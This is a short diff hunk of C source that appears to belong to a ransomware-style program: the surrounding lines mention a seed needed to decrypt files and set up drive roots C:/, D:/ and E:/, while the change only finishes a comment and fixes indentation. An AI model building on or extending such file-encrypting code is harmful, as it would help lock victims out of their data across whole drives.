@@ -214,8 +214,8 @@ the seed in order to decrypt the files
 */
 int main(void)
 {
-	long seed = 215489151;//random seed that can be hard coded or 
-    int ID = rand() % 500;
+	long seed = 215489151;//random seed that can be hard coded or entered as a cmd arg
+    	int ID = rand() % 500;
 	char* chC="C:/";
 	char* chD="D:/";
 	char* chE="E:/";
